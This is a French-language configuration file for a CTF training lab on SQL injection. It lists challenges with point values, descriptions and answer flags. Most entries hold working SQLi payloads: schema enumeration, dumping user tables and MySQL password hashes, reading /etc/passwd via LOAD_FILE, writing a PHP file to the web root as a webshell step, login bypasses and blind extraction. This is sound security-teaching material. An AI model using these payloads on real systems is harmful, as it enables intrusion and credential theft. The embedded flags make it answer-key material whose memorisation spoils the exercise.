#
# Training : SQLi
#

## avec debug
## avec sortie
## en aveugle

[Intro]
theme: Training
category: TrainSQLi
label: Web: SQLi - 2
docker: ctf-train-sqli
description: 
    ## SQL Injection
    .
    L'exploitation d'injection SQL va du très simple au très compliqué, mais la méthode reste toujours la même:
    .
    <u>Savoir exploiter la base de donnée</u>
    Le langage SQL permet d'écrire des requêtes qui fonctionnent sur la majorité des systèmes.
    Mais pour extraire les informations bas niveau (version, nom des tables, colonnes...), la syntaxe va dépendre de la base de donnée: mysql/mariadb, MS SQL Server, Oracle, PostgreSQL...
    Il faut donc connaitre la syntaxe et les commandes systèmes propres à chaque base de donnée.
    .
    <u>Détecter l'injection</u>
    La détection se fait en remplaçant une valeur par une fonction qui génère cette même valeur, en générant une erreur, ou en injectant  une commande sleep et en constatant le délai.
    .
    <u>Comprendre la requête SQL</u>
    Deviner la syntaxe de la requête SQL pour pouvoir injecter des commandes.
    .
    <u>Injecter une commande</u>
    On peut vouloir forcer un login, ou afficher le contenu d'une base. 
    .
    <u>Bypasser un éventuel filtre</u>
    Les développeurs filtrent généralement les inputs: detection d'espace, de ' ou de "
    Il est parfois possible de contourner ces filtres
    .
    <u>Exploitation des résultats</u>
    Le résultat d'une requête SQL peut être l'affichage de données. Dans ce cas, il faut identifie les champs, leur type, invalider les données légitimes et injecter les données à afficher.
    La requête peut ne rien afficher. Dans ce cas il faut générer des erreurs ou des délais et deviner les données avec des tests logiques.
    .
    De nombreux cheat-sheets existent:
    http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
    https://www.websec.ca/kb/sql_injection#MySQL_Default_Databases
    .
    SQLite:
    SQLite sheet: https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
                https://thanat0s.trollprod.org/2013/01/sqlite-le-mal-aime-des-sqli/


#
# Requetes MySQL


#
#
# https://localhost/ctf-train-sqli/request_mysql.php
# https://localhost/ctf-train-sqli/request_mysql.php
[identify_db]
name: SQL: vérifier que la base de donnée est mySQL, et obtenir sa version
category: TrainSQLi
value: 10
flag: 10.3.23-MariaDB 
description: 
    ```
    http://{IP_SERVER}/ctf-train-sqli/request_mysql.php
    http://{IP_SERVER}/IPSERVER/request_mysql.php
    ```
    Identifier la base de donnée utilisée:
    ```
    MySQL: SELECT @@version
    ```



[list_db]
name: Lister les databases
value: 10
category: TrainSQLi
flag: ctfdb
description: 
    ```
    http://{IP_SERVER}/ctf-train-sqli/request_mysql.php
    http://{IP_SERVER}/IPSERVER/request_mysql.php
    ```
    Lister les databases. 
    Il est possible d'obtenir la liste des bases de données avec la commande SHOW ou un SELECT.
    Lors d'un injection il sera plus simple d'utiliser un SELECT.
    ```
    SHOW Databases
    SELECT schema_name FROM information_schema.schemata;
    ```
    Il y a d'un coté les tables internes à mySQL, et d'un autre coté les bases applicatives qui contiennent les données dont login/password de l'application.
    Les tables internes sont:
    ```
    information_schema
    mysql
    performance_schema
    ```
    Il est possible d'en extraire les identifiants utilisés pour se connecter et faire les requêtes SQL.
    .
    Le flag est le nom de la table contenant les données de l'application du ctf.



[list_tables]
name: Lister les tables
value: 10
category: TrainSQLi
flag: users   
description: 
    ```
    http://{IP_SERVER}/ctf-train-sqli/request_mysql.php
    http://{IP_SERVER}/IPSERVER/request_mysql.php
    ```
    Lister les tables d'une databases. 
    ```
    SELECT table_name FROM information_schema.tables WHERE table_schema = 'xxx'
    ```
    .
    Le flag est le nom de la table qui contient les informations sur les utilisateurs.
    Le nom de cette table est passée dans l'usage courant, et il est souvent possible de requêter dessus en aveugle.



[list_columns]
name: Lister les colonnes d'une table
value: 10
category: TrainSQLi
flag: login 

description: 
    ```
    show columns from  users
    SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_SCHEMA='ctfdb' AND TABLE_NAME='users'
    ```
    Le flag est le nom de la colonne contenant le nom de l'utilisateur.



[dump_table]
name: Afficher le contenu d'une table
value: 10
category: TrainSQLi
flag: princess  
description: 
    ```
    SELECT * from users
    SELECT id, login from users
    ```
    Le flag est le mot de passe de max 


[dump_users]
name: Afficher le user avec lequel nous sommes conneté à mysql
value: 10
category: TrainSQLi
flag: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9  
flag2: 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9  
description: 
    Le serveur web se connecte à un serveur mysql avec des identifiants login/password souvent configurés dans les fichiers php.
    mySQL gère des droits d'accès pour chaque utilisateur.
    Pour connaitre l'utilisateur courant:
    ```
    SELECT user();
    SELECT system_user();
    ```
    Si vous avez les droits, afficher la liste des users et les mots de passe hashés
    ```
    SELECT user FROM mysql.user; 
    SELECT host, user, password FROM mysql.user;
    ```
    Essayer les commandes en tant que root, puis en tant que ctfuser.
    Le flag est le hash du mot de passe de ctfuser  



[read_file]
name: Afficher le contenu d'un fichier 
value: 10
category: TrainSQLi
description: 
    Si la requête sont faites par un utilisateur en ayant les droits, il est possible d'afficher tout fichier lisible par le process.
    ```
    SELECT LOAD_FILE('/etc/passwd')
    ```
    Lancer la requête en tant que user root, puis ctfuser.
    Le flag est le mot de passe de max 


[save_file]
name: Ecrire un fichier sur le disque... avec un webshell
value: 10
category: TrainSQLi
description: 
    Si la requête sont faites par un utilisateur en ayant les droits, il est possible d'écrire des fichiers.
    ```
    SELECT * FROM users INTO dumpfile '/var/www/html/yolo.php'
    SELECT '<?php phpinfo(); ?>' INTO dumpfile '/var/www/html/yolo.php'
    ```
    Lancer la requête en tant que user root, puis ctfuser.
    Si vous pouvez créer ce fichier, et y accéder, vous pouvez lancer un reverse shell.
 




#############################################################
# Detection
#



#
# Injection
# 
[type_req]
name: Types de requêtes SQL classiques à base de SELECT
value: 10
category: TrainSQLi
flag:   
description: 
    Input de type int
    ```
    SELECT * from users WHERE id=ARG1
    ```
    Input de type string
    ```
    SELECT id, name, password from users WHERE name='ARG1'
    ```
    Plusieurs arguments
    ```
    SELECT id, name, password from users WHERE name='ARG1' and password='ARG2'
    ```

[detect_int]
name: Detection sur paramètre de type int
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    1 => SELECT * from users WHERE id=1
    ```
    Effectuer un calcul et vérifier que le résultat ne change pas
    ```
    0+1 => SELECT * from users WHERE id=0+1
    ```
    Générer une erreur
    ```
    1" => SELECT * from users WHERE id=1"
    SELECT * from users WHERE id=1'
    SELECT * from users WHERE id=1')
    ```
    Générer un delai
    ```
    1 or SLEEP(3)
    ```


[detect_string]
name: Detection sur paramètre de type string
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    max => SELECT * from users WHERE login='max'
    ```
    Concaténer deux strings et vérifier que le résultat ne change pas
    ```
    SQLite: m'||'ax => SELECT * from users WHERE login='m'||'ax'
    ```
    Générer une erreur
    ```
    SELECT * from users WHERE id=max"
    SELECT * from users WHERE id=max'
    SELECT * from users WHERE id=max')
    ```
    Générer un delai. La valeur start valant 0, substr retourne une string nulle.
    ```
    SQLite: max' || substr(upper(hex(randomblob(99999999))),0,1)
    ```




[detect_polyglot]
name: Détecter un sqli avec un polyglot
value: 10
category: TrainSQLi
flag:   
description: 
    Un polyglot est un SQLi qui fonctionne aussi bien sur un int que sur une string.
    ```
    SLEEP(3) /*' or SLEEP(3) or '" or SLEEP(3) or "*/
    ```






#######################################################
# Login page
# 

[force_login]
name: Forcer l'authentification: première entrée de la base: or 1=1
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    aa' or 1=1  
    ```


[force_first_entry]
name: Forcer l'authentification: première entrée de la base: or 1=1 LIMIT 1
value: 10
category: TrainSQLi
flag:  
description: 
    ```
    aa' or 1=1 LIMIT 1  -- - 
    ``` 


[choose_existing_entry]
name: Forcer l'authentification: choisir une entrée de la base: or 1=1 LIMIT 1 OFFSET 1
value: 10
category: TrainSQLi
flag:  
hint:
description: 
    ```
     aa' or 1=1 LIMIT 1 OFFSET 2  -- - 
    ```


[inject_entry]
name: Forcer l'authentification: injecter une valeur: and 1=0 union select 'admin'
value: 10
category: TrainSQLi
flag:   
hint: 
description: 
    ```
    aa' and 1=0 UNION SELECT 'admin'
    ```



[guess_fields_number]
name: Forcer l'authentification: injecter une valeur: determiner le nombre de champs de la requête: UNION SELECT 1,2,3,4
value: 10
category: TrainSQLi
flag:   
hint: 
description: 
    ```
    aa' and 1=0 UNION SELECT 1 
    aa' and 1=0 UNION SELECT 1,2 
    aa' and 1=0 UNION SELECT 1,2,3 
    aa' and 1=0 UNION SELECT 1,2,3,4
    ```


[inject_login_passwd]
name: Forcer une authentification en injectant login et passwd md5 
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    admin' AND 1=0 UNION ALL SELECT 'admin', MD5(1234)
    ```



##################################################
# Product display
#



##################################################
# Blind injection
#

[blind_injection]
name: Utiliser l'authentification pour récupérer des informations en aveugle sur les bases de donnes
value: 10
category: TrainSQLi
flag:   
description: 
    ```
    #
    # Blind injection
    # Trouver un login qui fonctionne
    # SELECT * from users WHERE login='admin'-- -
    # Trouver un login qui fonctionne pas
    # SELECT * from users WHERE login='yolo'-- -
    # Ajouter des conditions pour forcer un true
    # SELECT * from users WHERE login='yolo' union SELECT 1,1,1 FROM users WHERE login='admin' AND+length(password)>30-- -
    # Trouver la longueur du champ
    # SELECT * from users WHERE login='yolo' union SELECT 1,1,1 FROM users WHERE login='admin' AND+length(password)>30-- -
    # Tester char par char
    # AND+substring(password,1/*pos*/,1/*len*/)='a'
    # yolo' or substring(login,1/*pos*/,3/*len*/)='adm'-- -
    ```



#
# Injection de header HTTP
#


[inject_http_header]
name: Injecter via un header HTTP
value: 10
category: TrainSQLi
flag:   
description: 
    curl xxx
